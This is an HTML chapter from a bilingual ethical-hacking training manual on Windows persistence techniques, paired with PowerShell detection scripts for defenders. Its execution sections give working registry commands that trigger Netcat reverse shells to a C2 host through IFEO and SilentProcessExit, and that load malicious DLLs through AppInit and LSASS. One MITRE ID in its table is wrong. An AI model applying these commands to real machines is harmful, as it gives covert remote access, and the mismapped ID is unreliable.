@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 22 — Advanced Windows Persistence | Ch. 22</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 22 — Advanced Windows Persistence</h1>
+<div class="sub">Ch. 22 — IFEO, GFLAGS, WMI e AppInit DLLs</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / Persistência</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#ifeo">IFEO</a></li><li><a href="#gflags">GFLAGS</a></li>
+<li><a href="#wmi">WMI</a></li><li><a href="#appinit">AppInit DLLs</a></li>
+<li><a href="#lsass">LSASS Packages</a></li><li><a href="#impact">Scripts de Impacto</a></li>
+<li><a href="#mitre">MITRE</a></li><li><a href="#mitig">Mitigações</a></li>
+<li><a href="#lab">Laboratório</a></li><li><a href="#revq">Revisão</a></li>
+<li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender as técnicas de persistência avançada que abusam de funcionalidades legítimas do Windows; executar IFEO Hijacking com <code class="inline">Debugger</code>; configurar GFLAGS/SilentProcessExit; criar subscrições WMI persistentes; injetar AppInit DLLs (32 e 64-bit); adicionar pacotes ao LSASS; <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand advanced persistence techniques abusing legitimate Windows features; execute IFEO Hijacking with <code class="inline">Debugger</code>; configure GFLAGS/SilentProcessExit; create WMI persistent subscriptions; inject AppInit DLLs (32 and 64-bit); add packages to LSASS; <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">A persistência em Windows é um jogo de gato e rato. O Windows fornece mecanismos legítimos que podem ser transformados em formas de garantir que código malicioso corre repetidamente após reboot ou logon. O que os torna atrativos é a <strong>durabilidade</strong>: uma vez configurados, sobrevivem a reinícios e fornecem execução repetida sem que o atacante tenha de reentrar manualmente no ambiente.</span>
+<span class="en">Persistence on Windows is a cat-and-mouse game. Windows provides legitimate mechanisms that can be turned into ways to ensure malicious code runs repeatedly after reboot or logon. What makes them attractive is <strong>durability</strong>: once configured, they survive restarts and provide repeated execution without the attacker having to manually re-enter the environment.</span>
+</div>
+</section>
+
+<section id="ifeo">
+<h2>3. IFEO Hijacking <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O Windows permite definir um <code class="inline">Debugger</code> para um processo alvo, para que o Windows inicie a tua linha de comando sempre que o utilizador abrir esse programa. O binário original permanece intacto e é lançado normalmente, mas o comando Debugger pode prepender ou acrescentar comportamento adicional. Como a configuração vive em HKLM, persiste após reboots e não depende de autoruns ou scheduled tasks.</span>
+<span class="en">Windows allows setting a <code class="inline">Debugger</code> for a target process, so Windows starts your command line whenever the user opens that program. The original binary remains intact and launches as usual, but the Debugger command can prepend or append additional behavior. Because the configuration lives in HKLM, it persists across reboots and doesn't rely on autoruns or scheduled tasks.</span>
+</div>
+<h3>3.1 Execução / Execution</h3>
+<pre>cmd#> copy calc.exe _calc.exe
+
+cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe -e c:\windows\system32\cmd.exe C2 9001" /f</pre>
+<div class="lang">
+<span class="pt">O <code class="inline">cmd /C</code> executa primeiro <code class="inline">_calc.exe</code> (para o utilizador ver a calculadora normal) e, após este sair, executa o Netcat. O operador <code class="inline">&</code> garante que o segundo comando só corre após o primeiro terminar.</span>
+<span class="en"><code class="inline">cmd /C</code> runs <code class="inline">_calc.exe</code> first (so the user sees the normal calculator), and after it exits, runs Netcat. The <code class="inline">&</code> operator ensures the second command only runs after the first finishes.</span>
+</div>
+<div class="callout danger">
+<strong>⚠️ Vantagens e desvantagens / Pros and cons:</strong>
+<div class="lang">
+<span class="pt"><strong>Prós:</strong> persiste após reboots, deixa a aplicação original intacta, e dispara naturalmente quando o utilizador abre um programa específico. <strong>Contras:</strong> requer admin para HKLM, e é altamente visível porque valores Debugger não-desenvolvedor são um padrão de abuso conhecido.</span>
+<span class="en"><strong>Pros:</strong> persists across reboots, leaves the original application intact, and triggers naturally when a user opens a specific program. <strong>Cons:</strong> requires admin for HKLM, and is highly visible because non-developer Debugger values are a known abuse pattern.</span>
+</div>
+</div>
+</section>
+
+<section id="gflags">
+<h2>4. GFLAGS e SilentProcessExit <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O Windows inclui funcionalidades de debugging e tracing que podem ser abusadas. O mecanismo <strong>SilentProcessExit</strong> permite configurar ações especiais quando um processo termina. Combinando com a definição <strong>GlobalFlag</strong> em IFEO, um atacante garante que, quando uma aplicação fecha, outro processo à sua escolha é lançado. Ao contrário de autoruns ou scheduled tasks, este método esconde-se na infraestrutura de diagnóstico do Windows.</span>
+<span class="en">Windows includes debugging and tracing features that can be abused. The <strong>SilentProcessExit</strong> mechanism allows configuring special actions when a process terminates. Combined with the <strong>GlobalFlag</strong> setting in IFEO, an attacker ensures that when an application closes, another process of their choice is launched. Unlike autoruns or scheduled tasks, this method hides in Windows' diagnostic infrastructure.</span>
+</div>
+<h3>4.1 Execução / Execution</h3>
+<pre>cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+
+cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+
+cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc -e \windows\system32\cmd.exe C2 9001"</pre>
+<div class="lang">
+<span class="pt">O primeiro comando define <code class="inline">GlobalFlag=512</code> para o Notepad, ativando o monitor de "silent process exit". O segundo ativa o reporting. O terceiro especifica o comando a executar quando o Notepad fecha. Cada vez que o utilizador fecha o Notepad, o sistema dispara silenciosamente um reverse shell Netcat.</span>
+<span class="en">The first command sets <code class="inline">GlobalFlag=512</code> for Notepad, enabling the "silent process exit" monitor. The second enables reporting. The third specifies the command to run when Notepad closes. Each time the user closes Notepad, the system silently triggers a Netcat reverse shell.</span>
+</div>
+<div class="callout info">
+<strong>Nota / Note:</strong>
+<div class="lang">
+<span class="pt">Este método <strong>não é detetado por ferramentas comuns de auditoria de persistência como o Autoruns</strong>, porque depende de ramos de registo menos conhecidos (SilentProcessExit) em vez de Startup, Run keys ou serviços.</span>
+<span class="en">This method is <strong>not detected by common persistence auditing tools like Autoruns</strong>, because it relies on lesser-known registry branches (SilentProcessExit) instead of Startup, Run keys, or services.</span>
+</div>
+</div>
+</section>
+
+<section id="wmi">
+<h2>5. WMI Event Subscriptions <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O WMI fornece um framework de monitorização e automação. Os atacantes podem abusar criando <strong>subscrições de eventos permanentes</strong> que vivem no repositório WMI e disparam payloads em timers ou eventos de sistema. Como estas subscrições são armazenadas no WMI em vez de chaves de registo óbvias ou pastas Startup, são mais furtivas e difíceis de detetar com ferramentas de inspeção casual.</span>
+<span class="en">WMI provides a monitoring and automation framework. Attackers can abuse it by creating <strong>permanent event subscriptions</strong> that live in the WMI repository and trigger payloads on timers or system events. Because these subscriptions are stored in WMI rather than obvious registry keys or Startup folders, they are stealthier and harder to spot with casual inspection tools.</span>
+</div>
+</section>
+
+<section id="appinit">
+<h2>6. AppInit DLLs <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O AppInit é uma funcionalidade legada do Windows que diz ao loader do OS para mapear uma ou mais DLLs em qualquer processo que ligue à <code class="inline">user32.dll</code>. Quando muitas aplicações GUI iniciam, o Windows carrega automaticamente as DLLs listadas nesse valor de registo, dando ao código dentro dessas DLLs a oportunidade de correr nesses processos. É um mecanismo de registo, machine-wide, que sobrevive a reboot e afeta aplicações GUI de 32 e 64-bit.</span>
+<span class="en">AppInit is a legacy Windows feature that tells the OS loader to map one or more DLLs into any process that links to <code class="inline">user32.dll</code>. When many GUI apps start, Windows automatically loads the DLLs listed in that registry value, giving code inside those DLLs a chance to run in those processes. It's a registry-based, machine-wide mechanism that survives reboot and affects both 32-bit and 64-bit GUI applications.</span>
+</div>
+<h3>6.1 Execução / Execution</h3>
+<pre>cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
+
+cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "C:\meter64.dll" /f
+
+cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
+
+cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "C:\meter32.dll" /f</pre>
+<div class="lang">
+<span class="pt">Os primeiros dois comandos ativam o AppInit e definem a DLL para processos de 64-bit. Os dois seguintes fazem o mesmo para o <code class="inline">Wow6432Node</code> (32-bit). O resultado é que aplicações GUI de ambas as arquiteturas carregam as DLLs especificadas.</span>
+<span class="en">The first two commands enable AppInit and set the DLL for 64-bit processes. The next two do the same for <code class="inline">Wow6432Node</code> (32-bit). The result is that GUI applications of both architectures load the specified DLLs.</span>
+</div>
+</section>
+
+<section id="lsass">
+<h2>7. LSASS Notification Packages <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Modificar a configuração do LSASS para carregar uma DLL extra é uma forma de obter execução de código dentro de um processo altamente privilegiado e de longa duração. O LSASS carrega pacotes de autenticação/notificação configurados no arranque; adicionar uma entrada aqui faz com que o módulo escolhido seja carregado nesse processo e permaneça ativo após reboots.</span>
+<span class="en">Modifying LSASS configuration to load an extra DLL is a way to get code execution inside a highly privileged, long-lived process. LSASS loads configured authentication/notification packages at startup; adding an entry here causes the chosen module to be loaded into that process and remain active across reboots.</span>
+</div>
+<h3>7.1 Execução / Execution</h3>
+<pre>cmd#> reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f</pre>
+<div class="lang">
+<span class="pt">Este comando diz ao Windows: "quando o LSASS iniciar, carrega também os pacotes <code class="inline">rassfm</code>, <code class="inline">scecli</code> e <code class="inline">meter</code>". O <code class="inline">meter</code> é a DLL maliciosa.</span>
+<span class="en">This command tells Windows: "when LSASS starts, also load the packages <code class="inline">rassfm</code>, <code class="inline">scecli</code>, and <code class="inline">meter</code>". <code class="inline">meter</code> is the malicious DLL.</span>
+</div>
+<div class="callout danger">
+<strong>⚠️ Risco / Risk:</strong>
+<div class="lang">
+<span class="pt">Esta técnica coloca código dentro de um processo de longa duração e alto privilégio, mas uma DLL mal configurada ou com bugs pode <strong>crashar o LSASS</strong>, destabilizando ou tornando o sistema inutilizável. É altamente suspeita para defensores.</span>
+<span class="en">This technique places code inside a long-running, high-privilege process, but a misconfigured or buggy DLL can <strong>crash LSASS</strong>, destabilizing or rendering the system unusable. It's highly suspicious to defenders.</span>
+</div>
+</div>
+</section>
+
+<section id="impact">
+<h2>8. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar as técnicas deste capítulo.</span>
+<span class="en">The scripts below help the blue team detect the techniques in this chapter.</span>
+</div>
+
+<h3>8.1 Script 22.1 — Deteção de IFEO Debugger / IFEO Debugger Detection</h3>
+<pre># Script 22.1 - IFEO Debugger Detection
+$out = ".\ifeo-detect.csv"
+$base = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+$hits = @()
+Get-ChildItem $base -EA SilentlyContinue | ForEach-Object {
+  $debugger = (Get-ItemProperty $_.PSPath -Name "Debugger" -EA SilentlyContinue).Debugger
+  if ($debugger) {
+    $hits += [PSCustomObject]@{ Process=$_.PSChildName; Debugger=$debugger; Severity="CRITICAL" }
+  }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] IFEO Debugger entries: $($hits.Count) -> $out" -ForegroundColor Red
+$hits | Format-Table -AutoSize</pre>
+
+<h3>8.2 Script 22.2 — Deteção de GFLAGS/SilentProcessExit / GFLAGS Detection</h3>
+<pre># Script 22.2 - GFLAGS/SilentProcessExit Detection
+$out = ".\gflags-detect.csv"
+$base = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit"
+$hits = @()
+Get-ChildItem $base -EA SilentlyContinue | ForEach-Object {
+  $monitor = (Get-ItemProperty $_.PSPath -Name "MonitorProcess" -EA SilentlyContinue).MonitorProcess
+  $report = (Get-ItemProperty $_.PSPath -Name "ReportingMode" -EA SilentlyContinue).ReportingMode
+  if ($monitor -or $report) {
+    $hits += [PSCustomObject]@{ Process=$_.PSChildName; MonitorProcess=$monitor; ReportingMode=$report; Severity="HIGH" }
+  }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] SilentProcessExit entries: $($hits.Count) -> $out" -ForegroundColor Red
+$hits | Format-Table -AutoSize</pre>
+
+<h3>8.3 Script 22.3 — Deteção de AppInit DLLs / AppInit Detection</h3>
+<pre># Script 22.3 - AppInit DLLs Detection
+$out = ".\appinit-detect.csv"
+$keys = @(
+  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows",
+  "HKLM:\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows"
+)
+$hits = @()
+foreach ($k in $keys) {
+  $load = (Get-ItemProperty $k -Name "LoadAppInit_DLLs" -EA SilentlyContinue).LoadAppInit_DLLs
+  $dlls = (Get-ItemProperty $k -Name "AppInit_DLLs" -EA SilentlyContinue).AppInit_DLLs
+  if ($load -eq 1 -and $dlls) {
+    $hits += [PSCustomObject]@{ Path=$k; LoadAppInit_DLLs=$load; AppInit_DLLs=$dlls; Severity="CRITICAL" }
+  }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] AppInit entries: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>8.4 Script 22.4 — Deteção de LSASS Packages / LSASS Detection</h3>
+<pre># Script 22.4 - LSASS Notification Packages Detection
+$out = ".\lsass-packages.csv"
+$key = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
+$packages = (Get-ItemProperty $key -Name "Notification Packages" -EA SilentlyContinue)."Notification Packages"
+$expected = @("rassfm","scecli")
+$hits = @()
+if ($packages) {
+  foreach ($p in $packages) {
+    if ($p -notin $expected -and $p -ne "") {
+      $hits += [PSCustomObject]@{ Package=$p; Severity="CRITICAL" }
+    }
+  }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Suspicious LSASS packages: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+</section>
+
+<section id="mitre">
+<h2>9. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Event Triggered Execution: IFEO Injection</td><td>T1546.012</td><td>IFEO Debugger</td></tr>
+<tr><td>Event Triggered Execution: PowerShell Profile</td><td>T1546.013</td><td>GFLAGS/SilentProcessExit</td></tr>
+<tr><td>Event Triggered Execution: WMI Event Subscription</td><td>T1546.003</td><td>WMI</td></tr>
+<tr><td>Hijack Execution Flow: AppInit DLLs</td><td>T1574.010</td><td>AppInit</td></tr>
+<tr><td>Boot or Logon Autostart Execution: LSASS Driver</td><td>T1547.008</td><td>LSASS Packages</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>10. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Auditar IFEO</strong> — Script 22.1. Valores Debugger não-desenvolvedor são suspeitos.</li>
+<li><strong>Auditar SilentProcessExit</strong> — Script 22.2. Ferramentas como Autoruns não detetam.</li>
+<li><strong>Auditar AppInit DLLs</strong> — Script 22.3. Verificar <code class="inline">LoadAppInit_DLLs</code> e <code class="inline">AppInit_DLLs</code>.</li>
+<li><strong>Auditar LSASS Packages</strong> — Script 22.4. Apenas <code class="inline">rassfm</code> e <code class="inline">scecli</code> são esperados.</li>
+<li><strong>Monitorizar WMI Event Subscriptions</strong> — usar Sysmon Event 19/20/21 ou ferramentas como WMI Explorer.</li>
+<li><strong>AppLocker/WDAC</strong> — bloquear DLLs não assinadas.</li>
+<li><strong>EDR com behavioral detection</strong> — deteta carregamento de DLLs suspeitas.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>11. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows isolada com snapshot. Testar cada técnica individualmente (criar a chave, verificar com o script de deteção, reverter). <strong>Objetivo:</strong> compreender o mecanismo e validar deteções.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows VM with snapshot. Test each technique individually (create the key, verify with detection script, revert). <strong>Goal:</strong> understand the mechanism and validate detections.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>IFEO</td><td><code class="inline">reg add ... Debugger ...</code></td><td><code class="inline">ifeo-detect.csv</code></td></tr>
+<tr><td>2</td><td>GFLAGS</td><td><code class="inline">reg add ... GlobalFlag 512 ...</code></td><td><code class="inline">gflags-detect.csv</code></td></tr>
+<tr><td>3</td><td>AppInit</td><td><code class="inline">reg add ... AppInit_DLLs ...</code></td><td><code class="inline">appinit-detect.csv</code></td></tr>
+<tr><td>4</td><td>LSASS</td><td><code class="inline">reg add ... Notification Packages ...</code></td><td><code class="inline">lsass-packages.csv</code></td></tr>
+<tr><td>5</td><td>Reverter</td><td>Remover chaves criadas</td><td>Output</td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li><code class="inline">ifeo-detect.csv</code></li>
+<li><code class="inline">gflags-detect.csv</code></li>
+<li><code class="inline">appinit-detect.csv</code></li>
+<li><code class="inline">lsass-packages.csv</code></li>
+<li>Chaves revertidas</li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>12. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>O que é o IFEO e como pode ser abusado? / What is IFEO and how can it be abused?</li>
+<li>Qual a diferença entre IFEO Debugger e GFLAGS/SilentProcessExit? / What's the difference between IFEO Debugger and GFLAGS/SilentProcessExit?</li>
+<li>Porque é que o GFLAGS não aparece no Autoruns? / Why doesn't GFLAGS appear in Autoruns?</li>
+<li>O que faz o AppInit DLLs? / What does AppInit DLLs do?</li>
+<li>Porque é que o LSASS Packages é perigoso? / Why is LSASS Packages dangerous?</li>
+<li>Como se deteta IFEO no blue team? / How to detect IFEO on the blue team?</li>
+<li>Quais os pacotes LSASS esperados por omissão? / Which LSASS packages are expected by default?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>13. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu cinco técnicas avançadas de persistência em Windows: <strong>IFEO Hijacking</strong> (Debugger em HKLM), <strong>GFLAGS/SilentProcessExit</strong> (execução quando um processo fecha, invisível ao Autoruns), <strong>WMI Event Subscriptions</strong> (subscrições permanentes no repositório WMI), <strong>AppInit DLLs</strong> (injeção em processos GUI de 32/64-bit) e <strong>LSASS Notification Packages</strong> (código dentro do LSASS, de alto risco). Acrescentámos <strong>quatro scripts de impacto</strong> (deteção de IFEO, GFLAGS, AppInit, LSASS) que ajudam o blue team a auditar estas localizações. O Cap. 23 entra nas ferramentas DFIR restantes (Impacket, Sliver).</span>
+<span class="en">This chapter covered five advanced Windows persistence techniques: <strong>IFEO Hijacking</strong> (HKLM Debugger), <strong>GFLAGS/SilentProcessExit</strong> (execution when a process closes, invisible to Autoruns), <strong>WMI Event Subscriptions</strong> (permanent subscriptions in WMI repository), <strong>AppInit DLLs</strong> (injection into 32/64-bit GUI processes), and <strong>LSASS Notification Packages</strong> (code inside LSASS, high risk). We added <strong>four impact scripts</strong> (IFEO, GFLAGS, AppInit, LSASS detection) that help the blue team audit these locations. Ch. 23 moves into the remaining DFIR tools (Impacket, Sliver).</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 22 / Ethical Hacker Training Manual — Ch. 22</div>
+<div style="margin-top:.6rem">
+<a href="cap21.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap23.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
